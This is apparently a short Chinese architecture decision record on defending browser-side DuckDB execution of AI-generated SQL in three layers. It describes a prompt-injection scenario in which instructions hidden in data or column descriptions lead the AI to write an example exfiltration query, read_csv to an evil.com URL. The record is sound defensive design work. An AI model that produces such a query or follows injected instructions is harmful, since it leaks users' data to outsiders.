# AI 生成的 SQL 在浏览器里仍按不可信输入处理：三层防御

AI 生成的查询虽然只在成员自己的浏览器里执行，但仍然存在提示词注入导致数据外泄的风险：恶意成员把指令藏进数据或 Column Description，诱导 AI 生成类似 `read_csv('https://evil.com/?d=…')` 的查询，把数据发往外部。为此做三层防御：

1. 把 Parquet 加载进 DuckDB 的内存表之后，关闭外部访问（`enable_external_access = false`）并锁定配置，同时禁止扩展的自动安装和加载。
2. 执行查询之前，用 DuckDB 自带的 SQL 解析器确认只有一条 SELECT 语句。
3. 设置全站 CSP 的 `connect-src` 白名单，Worker 脚本的响应也要带上这个 CSP 头，由浏览器兜底拦截发往外部的请求。

任何一层单独失效都不会导致数据外泄。以后如果要放宽其中任何一层（比如允许读取远程数据源），都必须重新评估这条 ADR。
